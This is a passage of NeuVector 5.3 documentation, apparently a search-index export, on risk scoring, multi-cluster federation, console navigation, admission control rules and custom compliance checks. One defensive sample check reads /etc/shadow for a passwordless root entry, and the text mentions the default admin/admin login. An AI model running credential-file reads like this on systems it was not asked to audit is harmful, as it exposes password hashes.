the Wizard to review Ingress and EgressReview all Ingress and Egress Connections to make sure they should be allowedSwitch all services that are still in Discover mode to Monitor or ProtectReview and Clear all threats, violations and session history by clicking the Delete/Trash icon for each one  Privileged and/or Root Containers​  Remove privileged containersRemove Root Containers Note: This may not be possible due to your required containers, however each of these only account for 4 points.  Admission Controls​  Make sure that, in a Kubernetes/OpenShift environment, Admission Control is enabled and there is at least one active rule in Policy -&gt; Admission Control  Vulnerabilities​  Make sure all non-system containers are in Monitor or Protect mode, in Policy -&gt; GroupsRemove/remediate host vulnerabilitiesRemove/remediate orchestrator platform (e.g. Kubernetes, OpenShift) vulnerabilities  How to Customize Which Container Groups Are Included in the Score​  To enable or disable which container Groups are included in the Security Risk Score, go to the Policy -&gt; Groups menu, and select the Group to modify. The summary column on the right has a 'Scorable' icon which indicates which groups are used for scoring.    Select or deselect the Scorable check box in the upper right for the selected Group.  note Only 'learned Groups' (e.g. those that begin with 'nv.') can be edited, not reserved groups or custom groups. ","version":"5.3","tagName":"h3"},{"title":"Security Policy & Rules","type":0,"sectionRef":"#","url":"/policy","content":"Security Policy &amp; Rules Manage network, process, and file system rules. Discover, Monitor, Protect Modes enable learning of normal application behavior and detection of violations.","keywords":"","version":"5.3"},{"title":"Enterprise Multi-Cluster Management","type":0,"sectionRef":"#","url":"/navigation/multicluster","content":"","keywords":"","version":"5.3"},{"title":"Enterprise Console​","type":1,"pageTitle":"Enterprise Multi-Cluster Management","url":"/navigation/multicluster#enterprise-console","content":" The NeuVector console can be used to manage large enterprise multi-cluster and multi-cloud deployments. One cluster should be selected as the Primary cluster, and other Remote clusters will then be able to join the Primary. Once connected, the Primary cluster can push Federated rules down to each remote cluster, which display as Federated rules in the consoles of each remote cluster. Scanned Federated registries will also sync the scan results with remote clusters. Only local users &amp; Rancher users who have admin permission can promote a cluster to become the primary cluster.  In addition to Federated policy, multi-cluster management supports monitoring of each remote cluster in a summary page, as shown below.    There MUST be network connectivity between the controllers in each cluster on the required ports. The controller is exposed external to its cluster by either a primary or remote service, as can be seen in the sample NeuVector deployment yaml file.  ","version":"5.3","tagName":"h3"},{"title":"Configuring the Primary and Remote Clusters​","type":1,"pageTitle":"Enterprise Multi-Cluster Management","url":"/navigation/multicluster#configuring-the-primary-and-remote-clusters","content":" Log into the console for the cluster which will be the Primary cluster. In the upper right drop down menu, select Multiple Clusters and then Promote to configure the Primary. Note: Only local users &amp; Rancher users who have admin permission can promote a cluster to become the primary cluster. Currently, SSO/LDAP/OIDC users with admin role are not allowed to promote a cluster to primary.  Enter the public IP and port of the fed-master service. You can find this by running  kubectl get svc -n neuvector   The output will look like:  NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE neuvector-service-controller-fed-master LoadBalancer 10.27.249.147 35.238.131.23 11443:31878/TCP 17d neuvector-service-controller-fed-worker LoadBalancer 10.27.251.1 35.226.199.111 10443:32736/TCP 17d   In the above example the primary controller host name/IP is 35.238.131.23 and the port is 11443. Note: Make sure this IP address and port are externally accessible (from the remote clusters). Note: The system clocks (time) must be the same for each primary and remote cluster in order to function properly.  After logging back into the console, select Multiple Clusters again from the upper right menu, and click on the icon to generate a token needed to connect the remote clusters. Copy the token for use in the next step. The token is valid for about 1 hour, and if expired must be generated again to connect future remote clusters.    To join a remote cluster to the primary, login to the remote cluster console as an admin. Select Multiple Clusters from the upper right drop down, and click on Join. Enter the controller IP or host name for the remote cluster as well as the port. Again, you can retrieve this information from the remote cluster by doing:  kubectl get svc -n neuvector   Use the output for the fed-worker of the remote cluster to configure the IP address and port. Then enter the token copied from the primary. Note that after entering the token, the IP address and port for the primary will be automatically filled in, but this can be edited or manually entered.    Log out of the remote cluster and log back into the primary. Or if already logged in, click refresh and the remote cluster will be listed in the Multiple Clusters menu.    You can click on the manage icon in the list, or use the pull down multi-cluster menu at the top to switch clusters at any time. Once you have switched to a remote cluster, all menu items on the left now apply to the remote cluster.  ","version":"5.3","tagName":"h3"},{"title":"Troubleshooting​","type":1,"pageTitle":"Enterprise Multi-Cluster Management","url":"/navigation/multicluster#troubleshooting","content":" To ensure the services are responding as expected, you can run the tests from outside the clusters, or, if needed, from the test pods on fed-master and fed-managed clusters to ensure network connection is allowed between the clusters.  Verify fed-master service​  The cluster service port 11443 is only accessible after enabling the fed-master service. The command below returns an error code when the fed-master service responds to indicate the requested resource is unavailable.  Output example {&quot;code&quot;:1,&quot;error&quot;:&quot;URL not found&quot;,&quot;message&quot;:&quot;URL not found&quot;}   info The URL for the curl command depends on how the fed-master services is exposed. If an ingress service is configured, it's not neccessary to specify a port.  curl -v https://&lt;fed-master&gt;[:&lt;port&gt;]/v1/eula   Verify fed-managed service​  The cluster service port 10443 is shared between REST API and the fed-managed service. The command below returns a success code when the fed-managed service responds to indicate it's available.  Output example {&quot;eula&quot;:{&quot;accepted&quot;:true}})   info The URL for the curl command depends on how the fed-managed services is exposed. If an ingress service is configured, it's not neccessary to specify a port.  curl -v https://&lt;fed-managed&gt;[:&lt;port&gt;]/v1/eula   ","version":"5.3","tagName":"h3"},{"title":"Federated Policy​","type":1,"pageTitle":"Enterprise Multi-Cluster Management","url":"/navigation/multicluster#federated-policy","content":" Please see the Policy -&gt; Federated Policy section for instructions on how to create Federated rules that will be pushed to each cluster.  ","version":"5.3","tagName":"h3"},{"title":"Federated Registries for Distributed Image Scanning Results​","type":1,"pageTitle":"Enterprise Multi-Cluster Management","url":"/navigation/multicluster#federated-registries-for-distributed-image-scanning-results","content":" The primary (master) cluster can scan a registry/repo designated as a federated registry. The scan results from these registries will be synchronized to all managed (remote) clusters. This enables display of scan results in the managed cluster console as well as use of the results in admission control rules of the managed cluster. Registries only need to be scanned once instead of by each cluster, reducing CPU/memory and network bandwidth usage.  Federated registries can only be configured by a federated admin on the primary cluster in Assets -&gt; Registries. After adding and scanning a federated repository, the scan results will be synchronized to all managed clusters. Admission control rules in each managed cluster which require image scanning (e.g. CVE, compliance based rules) will automatically use both federated scan results as well as any registry scans results locally configured.  Federating Results from CI/CD Scanners (Optional)​  Federated registry scan results are always sync'd to managed clusters, as described above. The primary cluster can also receive scan results from stand alone scanner scans or scanner plug-ins invoked from a build CI/CD pipeline. To enable build phase (CI/CD) repository scanning results to also sync to managed clusters, first enable it by editing the primary (master) cluster settings as shown below.   ","version":"5.3","tagName":"h3"},{"title":"Navigating the Console","type":0,"sectionRef":"#","url":"/navigation/navigation","content":"","keywords":"","version":"5.3"},{"title":"Console Access​","type":1,"pageTitle":"Navigating the Console","url":"/navigation/navigation#console-access","content":" The default user and password are admin.  Please see the first section Basics -&gt; Connect to Manager for configuration options such as turning off https, accessing the console through a corporate firewall which does not allow port 8443, or replacing the self-signed certificate.  ","version":"5.3","tagName":"h3"},{"title":"Menus and Navigation​","type":1,"pageTitle":"Navigating the Console","url":"/navigation/navigation#menus-and-navigation","content":" Use the left side menu to navigate in your NeuVector console. Note that there are additional settings in upper right for User Profile and Multi-Cluster configuration.  Dashboard​  The Dashboard shows a summary of risk scores, security events, and application protocols detected by NeuVector. It also shows details for some of these security events. PDF reports can be generated from the Dashboard which contain detailed charts and explanations.  At the top of the dashboard there is a summary of the security risks in the cluster. The wrench tool next to the overall risk score can be clicked to open a wizard which will guide you through recommended steps to reduce/improve the risk score. Mousing over each risk gauge will provide a description of it to the right and how to improve the risk score. Also see the separate documentation section Improving Security Risk Score.    Overall Security Risk Score. This is a weighted summary of the individual risk areas summarized to the right, including Service exposure, Ingress/Egress exposure, and Vulnerability exploit risks. Click on the wrench to improve the score.Service Exposure Risk Score. This is an indicator of how many services are protected by whitelist rules and running in the Monitor or Protect mode, where risk is lowest. A high ratio of services in Discover mode means these services are not segmented or isolated by whitelist rules.Ingress/Egress Risk Score. This is a weighted summary of actual threats or network violations detected on ingress or egress (out of the cluster) connections, combined with allowed ingress/egress connections. External connections which are protected by whitelist rules have lower risk but can still be attacked by embedded network attacks. Note: A list of ingress and egress IPs can be downloaded from the Ingress/Egress details section as an Exposure Report.Vulnerability Exploit Risk Score. This is the risk of exploits of vulnerabilities in running containers. Services in Discover mode with High criticality vulnerabilities will have the highest impact on the score, as they are highest risk. If services are in Monitor or Protect but still have High vulnerabilities, they are protected by network and process rules to identify (and block) suspicious activity, so will have a lower weighting on the score. A warning will be shown if the Auto-Scan button is not enabled for automatic run-time scanning.  Some of the charts are interactive, as shown below with the green arrows.    Some of the event data shown in the dashboard have limits, as described in the Reporting section.  Application Protocols Detected This chart summarizes the application protocols detected in live connections in the cluster. The category ‘Other’ means any unrecognized HTTP protocols or raw TCP connections. You can toggle between the Application Coverage and the Application Volume levels.  Application Coverage is the number of unique pod to pod conversations detected between application services. For example if service pod A connects to service pod B using HTTP that is one unique HTTP ‘conversation’, but all connections between A and B count as one conversation.Application Volume is the network activity measured in Gbytes for all services using that protocol.  Network Activity​  This provides a graphical map of your containers and the conversations between containers. It also shows connections with other local and external resources. In Monitor and Protect modes, violations are displayed with red or yellow lines to indicate that a violation has been detected.  note If a large number of containers or services are present, the view will automatically default to a namespace view (collapsed). Double click on a namespace icon to expand it.  note This display uses a local GPU if available to speed loading times. Some Windows GPUs have known issues, and the use of the GPU can be turned off in Advanced Filter window (see below for Tools).  Some of the actions possible are:  Move objects around to better view services and conversationsClick on any line (arrow) to see more detail such as protocol/port, latest time stamp, and to add or edit a rule (NOTE: both connection endpoints must be fully expanded by double clicking on each in order to see the connection details)Click on any container to see details, and the ‘i’ for real-time connections. You can also quarantine a node from here. Right click on a container to perform actions.Filter view by protocol, or search by namespace, group, container (upper right). You can add multiple filters to the selection box.Refresh the map to show latest conversationsZoom in/out to switch between a logical view (all containers collapsed into a service group) or physical view (all containers for the same service displayed)Toggle on/off the display of orchestration components such as load balancers (e.g. built in for Kubernetes or Swarm)(Service Mesh Icon) Double click to expand a pod in a service mesh such as Istio/Linkerd2 to show the sidecar and workload containers within the pod.  The Tools menu in the upper left has these functions, from left to right:  Zoom in/outReset the icon displays (if you've moved them around)Open the Advanced Filter window (filters remain for the user login session)Display/Hide the LegendTake a screen shotRefresh the Network Activity Display    Right clicking on a container displays the following actions:    You can view active sessions, start packet capture recordings, and quarantine from here. You can also change the overall protection mode for the service (all containers for that service) here. The expand/collapse options enable you to simplify or expand the objects.  The data in the map may take a few seconds after network activity to be displayed.  See the explanation of the Legend icons at the bottom of this page.  Assets​  Assets displays information about Platforms, Nodes, Containers, Registries, Sigstore Verifiers (used in Admission Control rules), and System Components (NeuVector Controllers, Scanners, and Enforcers).  NeuVector includes an end-to-end vulnerability management platform which can be integrated into your automated CI/CD process. Scan registries, images, and running containers and host nodes for vulnerabilities. Results for individual registries, nodes, and containers can be found here, while combined results and advanced reporting can be found in the Security Risks menu.  NeuVector also automatically runs the Docker Bench security report and Kubernetes CIS Benchmark (if applicable) on each host and running containers.  Note that the Status of all containers is shown in Assets -&gt; Containers, which indicates the NeuVector protection mode (Discover, Monitor, Protect). If the container is shown in an 'Exit' state, it is still on the host but is stopped. Removing the container will remove it from an Exit state.  Please see the section Scanning &amp; Compliance for additional details, including how to use the Jenkins plug-in NeuVector Vulnerability Scanner.  Policy​  This displays and manages the run-time Security Policy which determines what container networking, process, and file system application behavior is ALLOWED and DENIED. Any conversations and activities which are not explicitly allowed are logged as violations by NeuVector. This is also where Admission Control rules can be created.  Please see the Security Policy section of these docs for a detailed explanation of the behavior of the rules and how to edit or create rules.  Security Risks​  This enables customizable Vulnerability and Compliance management investigation, triage, and reporting. Easily research image vulnerabilities and find out which nodes or containers contain those vulnerabilities. Advanced filtering makes reviewing scan and compliance check results and provides customized reporting.  These menu's combine results from registry (image), node, and container vulnerability scans and compliance checks to enable end-to-end vulnerability management and reporting.  Notifications​  This is where you can see the logs for Security Events, Risk Reports (e.g. Scanning) and general Events. NeuVector also supports SYSLOG for integration with tools such as SPLUNK as well as webhook notifications.  Security Events  Use the search or Advanced Filter to locate specific events. The timeline widget at the top can also be adjusted using the left and right circles to change the time window. You can also easily add rules (Security Policy) to allow or deny the detected event by selecting the Review Rule button and deploying a new rule.  NeuVector continuously monitors all containers for know attacks such as DNS, DDoS, HTTP-smuggling, tunneling etc. When an attack is detected it is logged here and blocked (if container/service is set to protect), and the packet is automatically captured. You can view the packet details, for example:  Implicit Deny Rule is Violated  Violations are connections that violate the whitelist Rules or match a blacklist Rule. Violations detailed are captured and source IPs can be investigated further.  Other security events include privilege escalations, suspicious processes, or abnormal file system activity detected on containers or hosts.  Risk Reports  Registry scanning, run-time scanning, admission control events will be shown here. Also, CIS benchmarks and compliance checks results will be shown.  Please see the Reporting section for additional details and limits of the event displays in the console.  Settings​  Settings -&gt; Users &amp; Roles​  Add other users here. Users can be assigned an Admin role, a Read-only role, or custom role. In Kubernetes, users can be assigned one or more namespaces to access. Custom roles can also be configured here for users and Groups (e.g. LDAP/AD) to be mapped to the roles. See the users section for configuration details.  Settings -&gt; Configuration​  Configure a unique cluster name, new services mode, and other settings here.  If deploying on a Rancher or OpenShift cluster, authentication can be enabled such that Rancher users or OpenShift users can log into the NeuVector console with the associated RBACs. For Rancher users, a connecting button/link from the Rancher console allows Rancher admin's to open and access the NeuVector console directly.  The New Service Mode sets which protection mode any new services (applications) previously unknown or undefined in NeuVector will by default be set to. For production environments, it is not recommended to set this to Discover.  The Network Service Policy Mode, if enabled, applies the selected policy mode globally to the network rules for all groups, and each Group’s individual policy mode will only apply to process and file rules.  The Automated Promotion of Group Modes promotes a Group’s protection Mode automatically (from Discover to Monitor to Protect) based on elapsed time and criteria.  The Auto-Deletion of Unused Groups is useful for automated 'clean-up' of the discovered (and auto-created rules for) groups which are no longer in use, especially high-churn development environments. See Policy -&gt; Groups for the list of groups in NeuVector. Removing unused Groups will clean up the Groups list and all associated rules for those groups.  The X-FORWARDED-FOR enables/disables use of these headers in enforcing NeuVector network rules. This is useful to retain the original source IP of an ingress connection so it can be used for network rules enforcement. Enable means the source IP will be retained. See below for a detailed explanation.  Multiple webhooks can be configured to be used in Response Rules for customized notifications. Webhook format choices include Slack, JSON, and key-value pairs.  A Registry Proxy can be configured if your registry scanning connection between the controller and the registry must go through a proxy.  Configure SIEM integration through SYSLOG, including types of events, port etc. You can also choose to send events to the controller pod logs instead of or in addition to syslog. Note that these events will only be sent to the lead controller pod's log (not all controller pod logs in a multi-controller deployment).  An integration with IBM Security Advisor and QRadar can be established.  Import/Export the Security Policy file. You can configure SSO for SAML and LDAP/AD here as well. See the Enterprise Integration section for configuration details. Important! Be careful when importing the configuration file. Importing will overwrite the existing settings. If you import a ‘policy only’ file, the Groups and Rules of the Policy will be overwritten. If you import a file with ‘all’ settings, then the Policy, Users, and Configurations will be overwritten. Note that the original ‘admin’ user’s password of your current Controller will also be overwritten with the original admin’s password in the imported file.  The Usage Report and Collect Log exports may be requested by your NeuVector support team.  X-FORWARDED-FOR Behavior Details​  In a Kubernetes cluster, an application can be exposed to the outside of the cluster by a NodePort, LoadBalancer or Ingress services. These services typically replace the source IP while doing the Source NAT (SNAT) on the packets. As the original source IP is masqueraded, this prevents NeuVector from recognizing the connection is actually from the 'external'.  In order to preserve the original source IP address, the user needs to add the following line to the exposed services, in the 'spec' section of the external facing load balancer or ingress controller. (Ref: https://kubernetes.io/docs/tutorials/services/source-ip/)  &quot;externalTrafficPolicy&quot;:&quot;Local&quot;   Many implementations of LoadBalancer services and Ingress controllers will add the X-FORWARDED-FOR line to the HTTP request header to communicate the real source IP to the backend applications. This product can recognize this set of HTTP headers, identify the original source IP and enforce the policy according to that.  This improvement created some unexpected issues in some setup. If the above line has been added to the exposed services and NeuVector network policies have been created in a way that expect the network connections are coming from internal proxy/ingress services, because we now identify the connections are from &quot;external&quot; to the cluster, normal application traffic might trigger alerts or get blocked if the applications are put in &quot;Protect&quot; mode.  A switch is available to disable this feature. Disabling it tells NeuVector not to identify that the connection is from &quot;external&quot; using X-FORWARDED-FOR headers. By default this is enabled, and the X-FORWARDED-FOR header is used in policy enforcement. To disable it, go to Settings -&gt; Configuration, and disable the &quot;X-Forwarded-For based policy match&quot; setting.  Settings -&gt; LDAP/AD, SAML, and OpenID Connect​  NeuVector supports integration with LDAP/AD, SAML, and OpenID Connect for SSO and user group mapping. See the Enterprise Integration section for configuration details.  Multiple Cluster Management​  You can manage multiple NeuVector clusters (e.g. multiple Kubernetes clusters running NeuVector on different clouds or on premise) by selecting a Master cluster, and joining remote clusters to them. Each remote cluster can also be individually managed. Security rules can be propagated to multiple clusters through use of Federated Policy settings.  My Profile​  You can increase the browser timeout setting, change your password and do other administrative profile edits.  Icon Descriptions in Legend &gt; Network Activity​  You can toggle the Legend on/off in the tools box of the Network Activity map.  Here is what the icons mean:  External network​  This is any network outside the NeuVector cluster. This could include internet public access or other internal networks.  Namespace​  Namespace in Kubernetes or Project in OpenShift  Group/Container/Service Mesh in discovery​  This container is in Discover mode, where connections to/from it are learned and whitelist rules will automatically be created.  Group/Container/Service Mesh being monitored​  This container is in Monitor mode, where violations will be logged but not blocked.  Group/Container/Service Mesh being protected​  This container is in Protect mode, where violations will be blocked.  Container Group​  This represent a group of containers in a service. Use this to provide a more abstract view if there are many container instances for a service/application (i.e. from the same image).  Un-managed node​  This node has been detected but does not have a NeuVector enforcer on it.  Un-managed container​  This container has been detected but is not on a node with a NeuVector enforcer on it. This could also represent some system services.  Exited Container​  This container is not running but in an 'exited' state.  IP group​  This is a group of IP Addresses.  Normal Conversation​  Allowed, whitelisted connections are displayed in blue.  Internal Conversation​  A connection within a service is shown in light gray.  Conversation with warning​  A connection which has generated a violation alert is shown in lighter red.  Conversation being blocked​  If a connection is a violation, as shown in red, and has been blocked by NeuVector, the arrow will have an ‘x’ in it.  Quarantined container​  Containers with a red circle around them have been quarantined. To un-quarantine, right-click on the container and select the un-quarantine button. ","version":"5.3","tagName":"h3"},{"title":"Configuration Assessment for Kubernetes Resources","type":0,"sectionRef":"#","url":"/policy/admission/assessment","content":"","keywords":"","version":"5.3"},{"title":"Kubernetes Resource Deployment File Scanning​","type":1,"pageTitle":"Configuration Assessment for Kubernetes Resources","url":"/policy/admission/assessment#kubernetes-resource-deployment-file-scanning","content":" NeuVector is able to scan deployment yaml files for configuration assessments against Admission Control rules. This is useful to scan deployment yaml files early in the pipeline to determine if the deployment would violate any rules before attempting the deployment.  To upload a yaml file to be scanned, go to Policy -&gt; Admission Control and click the Configuration Assessment button. In the window, select a file to upload, then Test.    You will then see an analysis of the file, whether the deployment would be allowed, and messages for rules that would apply to the deployment file. ","version":"5.3","tagName":"h3"},{"title":"Sigstore Cosign Signature Verifiers","type":0,"sectionRef":"#","url":"/policy/admission/sigstore","content":"","keywords":"","version":"5.3"},{"title":"Configuring Sigstore/Cosign Verifiers for Requiring Image Signing​","type":1,"pageTitle":"Sigstore Cosign Signature Verifiers","url":"/policy/admission/sigstore#configuring-sigstorecosign-verifiers-for-requiring-image-signing","content":" NeuVector enables a user to perform signature verification logic by integrating image signatures generated by Sigstore's cosign tool.  The following is an example of an admission control configuration that requires a deployment's image be signed by an appropriate key or identity.  First, configure a root of trust. This can either be a public or private root of trust, depending on the Sigstore deployment used to generate signatures. If you have deployed your own instances of Sigstore's services, select the private root of trust option.  A public root of trust does not need any additional configuration outside of giving it an easily referenced name.    A private root of trust requires the the keys and/or certificates from your privately deployed instances of Sigstore's services.    Next, for a given root of trust, configure each of the verifiers that you would like to use during admission control. There are two types of verifiers: keypair and keyless. A keypair verifier would be used when trying to verify an image signed by a user-defined private key. A keyless verifier would be used when verifying a signature generated by Sigstore's keyless pattern. More information about the Sigstore signing methods can be seen here.  To configure a keypair verifier, provide a name, and a public key corresponding to a target private key.    To configure a keyless verifier, provide the OIDC issuer and identity used during signing.    Note that after root-of-trust and verifier configuration, an image must be scanned in order to determine which verifiers the given image's signatures satisfy.  The configured verifiers that an image satisfies can be viewed in the upper right section of a given image's scan results in Assets-&gt;Registries. If an image is not signed by a verifier, it will not appear in its scan results.    To reference a particular root of trust and verifier in an admission control rule, join the two names with a forward slash like so: my-root-of-trust/my-verifier.    To require an image be signed in an admission control rule, set the True/False value for the Image Signed criteria.   ","version":"5.3","tagName":"h3"},{"title":"Federated Policy","type":0,"sectionRef":"#","url":"/policy/federated","content":"","keywords":"","version":"5.3"},{"title":"Federated Policy​","type":1,"pageTitle":"Federated Policy","url":"/policy/federated#federated-policy","content":" After a Master cluster has been created, Federated rules can be created in the Master which are automatically propagated to each cluster. This is useful to create global rules that should be applied to each cluster, such as global network rules. Federated rules will appear in every cluster as read-only and can NOT be deleted or edited by the local admin of the cluster.  To configure Federated rules, click on Federated Policy in the upper right drop down menu. You will see tabs for Groups, Admission Control, Network Rules and other rules which can be federated. Select the tab and create a new Group or rule. In the sample below, two Federated groups have been created, which will be propagated to each cluster.    And the following Federated Network Rule has been created to allow access of SSL from the node demo pods to google.com.    After these rules and groups have been propagated to the remote cluster(s), they will appear as Federated rules and groups in the local cluster's console.    In the above example, the Federated rule is shown which is different than learned rules and 'user created' rules which were created in the local cluster. The user created rule 1 can be selected for editing or deletion while the Federated can not. In addition, Federated network rules will always show at the top of the list, thus taking precedence over other rules.  Other rules such as Admission Control, Response, Process and File will behave in the same way, except that the order of rules is only relevant for the Network rules.  Note that the configuration of Process and File rules requires the selection of a Federated Group, as these must be applied to a target group as defined in the Federated Group tab. After a new Group has been configured in Federated -&gt; Groups, it will show as a selectable option when configuring a group in Process or File rules. ","version":"5.3","tagName":"h3"},{"title":"Custom Compliance Checks","type":0,"sectionRef":"#","url":"/policy/customcompliance","content":"","keywords":"","version":"5.3"},{"title":"Creating Custom Scripts for Compliance Checks​","type":1,"pageTitle":"Custom Compliance Checks","url":"/policy/customcompliance#creating-custom-scripts-for-compliance-checks","content":" Custom scripts can be run on containers and hosts for use in compliance checks and other assessments. The Custom Compliance check is a bash script that can be run on any container to validate a condition and report result in the container or node compliance section.  note The ability to create custom scripts is disabled by default to protect against misuse. This can be enabled be setting the CUSTOM_CHECK_CONTROL environment variable in the Controller and Enforcer. Values are &quot;disable&quot; (default, not allowed), &quot;strict&quot; (admin role only), or &quot;loose&quot; (admin, compliance, and runtime-policy roles).  caution Custom scripts should be used with extreme caution. The custom script can run any executable in the container namespace with container privilege. Executables can be very destructive, such as rm, format, fdisk etc. This caution applies to hosts/nodes as well. Custom check scripts on hosts can be even more destructive if they can access the master node in the cluster.  A custom script is controlled by the run-time policy permission with namespaced RBAC; users should setup the Kubernetes user roles properly.Custom scripts are run with the same privilege as the running container.The compliance result is removed once a custom script is deleted.Custom Compliance checks need to follow a format in order to report the result correctly in the compliance report for the container or node. Script starts with 'if' statement to check some conditionCustom check is pass if exit code is 0Custom check is fail if exit code is 1  Sample script to check if container has root account with no password.​  if [ $(cat /etc/shadow | grep 'root:::0:::::') ]; then DESCRIPTION=&quot;CVE-2019-5021 fails.&quot; echo $DESCRIPTION; exit 1; else echo &quot;CVE-2019-5021 pass&quot;; exit 0; fi   Sample script to check dirty cow file in the container.​  if [ $(find . / | grep -w 'cow') ]; then DESCRIPTION=&quot;dirty cow seen in the container&quot; echo $DESCRIPTION; exit 1; else echo &quot;no dirty cow found pass&quot;; exit 0; fi   Other Notes  Scripts have a timeout of 1 minute to complete, otherwise they are killed and reported as an error in the compliance result.Script can be executed when in all 3-operating modes, Discover, Monitor, and Protect.  ","version":"5.3","tagName":"h3"},{"title":"Creating a custom check script​","type":1,"pageTitle":"Custom Compliance Checks","url":"/policy/customcompliance#creating-a-custom-check-script","content":" Select the service group (user created or auto learned) from Policy -&gt; Group.Click custom check tab.Enter name of the script. Spaces are not allowed.Copy and paste script to script section.Click ADD button to add script.Multiple scripts can be created and managed from the option provided in the right side corner.Scripts are run on the containers covered by the service group as soon as script is created as well as when the script is updated.View the script result from Assets -&gt; Container -&gt; Compliance, or Assets -&gt; Nodes -&gt; Compliance.  Samples​  Creating a custom check script on demo group comprised of 3 containers    Showing compliance results for nginx container, which has a dirty cow file, so a warning is reported.    Showing compliance result for nodejs container, which does not have a dirty cow file, so a pass is reported from the script.    Showing compliance result for nginx container for a custom check that had a timeout.    ","version":"5.3","tagName":"h3"},{"title":"Creating a response rule for compliance report​","type":1,"pageTitle":"Custom Compliance Checks","url":"/policy/customcompliance#creating-a-response-rule-for-compliance-report","content":" Response rules can be created in Policy -&gt; Response Rules that are based on results of custom compliance check results. The results are part of the category Compliance, and responses can be created for all events of a certain level.  Choose category complianceType service group name in group option and choose desired group from auto select optionType level and choose level:Warning from auto select optionEnable desired actions Quarantine, webhook and/or suppress logEnable status buttonClick Add button to add the response rule  The next compliance event with result warning will trigger the corresponding response rule action.    Create a response rule for compliance report and custom check script by name:  Choose category complianceType service group name in the group option and choose the desired group from drop down options, or leave the group name blank to apply to allType 'n' and choose custom check script name from the drop down menu of optionsEnable desired actions Quarantine, webhook and/or suppress logEnable status buttonClick Add button to add the response rule  The next compliance event with warning will trigger the corresponding response rule action.   ","version":"5.3","tagName":"h3"},{"title":"Admission Controls","type":0,"sectionRef":"#","url":"/policy/admission","content":"","keywords":"","version":"5.3"},{"title":"Controlling Image / Container Deployments​","type":1,"pageTitle":"Admission Controls","url":"/policy/admission#controlling-image--container-deployments","content":" With Admission Control integration with orchestration platforms such as Kubernetes and OpenShift, NeuVector is playing an important role within the orchestration platform’s deployment pipeline. Whenever a cluster resource such as Deployment is created, the request from the cluster apiserver will be passed to one of the NeuVector Controllers to determine if it should be allowed to deploy or denied based on the user-defined Admission Control rules prior to creating the cluster resource. The policy decision NeuVector makes will be passed back to cluster apiserver for enforcement.  This feature is supported in Kubernetes 1.9+ and Openshift 3.9+. Before using the Admission Control function in NeuVector, while it's possible to setup admission control from --admission-control argument passed to the cluster apiserver, it's recommended to use dynamic admission control. Please see Kubernetes and Openshift sections below for configuration.  Kubernetes​  The ValidatingAdmissionWebhook and MutatingAdmissionWebhook plugins are enabled by default.  Check if admissionregistration.kubernetes.io/v1beta1 is enabled  kubectl api-versions | grep admissionregistration admissionregistration.k8s.io/v1beta1   Openshift​  The ValidatingAdmissionWebhook and MutatingAdmissionWebhook plugins are NOT enabled by default. Please see the examples in the OpenShift deployment sections for instructions on how to enable these. A restart of the OpenShift api and controllers services is required.  Check if admissionregistration.kubernetes.io/v1beta1 is enabled  oc api-versions | grep admissionregistration admissionregistration.k8s.io/v1beta1   ","version":"5.3","tagName":"h3"},{"title":"Enabling Admission Control (Webhook) in NeuVector​","type":1,"pageTitle":"Admission Controls","url":"/policy/admission#enabling-admission-control-webhook-in-neuvector","content":" The Admission Control feature is disabled by default. Please go to Policy -&gt; Admission Control page to enable it in the NeuVector console.    Once the Admission Control feature is enabled successfully, the following ValidatingWebhookConfiguration resource will be created automatically. To check it:  kubectl get ValidatingWebhookConfiguration neuvector-validating-admission-webhook   Sample output:  NAME CREATED AT neuvector-validating-admission-webhook 2019-03-28T00:05:09Z   The most important information in ValidatingWebhookConfiguration resource for NeuVector is cluster resources. Currently once a cluster resource such as Deployment NeuVector registered is created, the request will be sent from orchestration platform apiserver to one of the NeuVector Controllers to determine if it should be allowed or denied based on the user-defined rules in NeuVector Policy -&gt; Admission Control page.  If the resource deployment is denied, an event will be logged in Notifications.  To test the Kubernetes connection for the client mode access, go to Advanced Setting.    For special cases, the URL access method using the NodePort service may be required.  ","version":"5.3","tagName":"h3"},{"title":"Admission Control Events/Notifications​","type":1,"pageTitle":"Admission Controls","url":"/policy/admission#admission-control-eventsnotifications","content":" All admission control events for allowed and denied events can be found in the Notifications -&gt; Security Risks menu.  ","version":"5.3","tagName":"h3"},{"title":"Admission Control Criteria​","type":1,"pageTitle":"Admission Controls","url":"/policy/admission#admission-control-criteria","content":" NeuVector supports many criteria for creating an Admission Control Rule. These include CVE High Count, CVE Names, image labels, imageScanned, namespace, user, runAsRoot, etc. There are two possible sources of criteria evaluation, Image Scans and Deployment Yaml file scans. If a criterion requires an image scan, the scan results from Registry Scanning will be used. If the image was not scanned, the admission control rule will not be applied. If a criterion requires scanning of the deployment yaml, it will be evaluated from the Kubernetes deployment. Some criteria will use the results from either an image scan OR a deployment yaml scan.  CVE score is an example of a criterion requiring an image scan.Environment variables with secrets is an example of a criterion using the deployment yaml scan.Labels and Environment variables are examples of criteria which will use BOTH image and deployment yaml scans results (logical OR) to determine matches.    After the criterion is selected, the possible Operators will be displayed. Click the ‘+’ button to add each criterion.  Using Multiple Criteria in a Single RuleThe matching logic for multiple criteria in one admission control rule is:  For different criteria types within a single rule, apply 'and'For multiple criteria of same type (e.g. multiple namespaces, registries, images), Apply 'and' for all negative matches(&quot;not contains any&quot;, &quot;is not one of&quot;) until the first positive match;After the first positive match, apply 'or'  Example with Matching a Pod Label​  apiVersion: apps/v1 kind: Deployment metadata: name: iperfserver namespace: neuvector-1 spec: replicas: 1 template: metadata: labels: app: iperfserver   The rule to match would be:    Example with Matching Environment Variables with Secrets​  apiVersion: apps/v1 kind: Deployment metadata: name: iperfserver namespace: neuvector-1 labels: name: iperfserver spec: selector: matchLabels: name: iperfserver replicas: 1 template: metadata: labels: name: iperfserver spec: containers: - name: iperfserver image: nvlab/iperf env: - name: env1 value: AIDAJQABLZS4A3QDU576 - name: env2 valueFrom: fieldRef: fieldPath: status.podIP - name: env5 value: AIDAJQABLZS4A3QDU57E command: - iperf - -s - -p - &quot;6068&quot; nodeSelector: nvallinone: &quot;true&quot; restartPolicy: Always   The Matching rule would be:  Criteria Related to Scan Results​  The following criteria are related to the results in NeuVector Assets &gt; Registry scan page:  Image, imageScanned, cveHighCount, cveMediumCount, Image compliance violations, cveNames and others.  Before NeuVector performs the match against the Admission Control rules, NeuVector retrieves the image information (For example, 10.1.127.3:5000/neuvector/toolbox/iperf:latest) from the cluster apiserver (Please refer to Request from apiserver section below). The image is composed by registry server (https://10.1.127.3:5000), repository (neuvector/toolbox/iperf) and 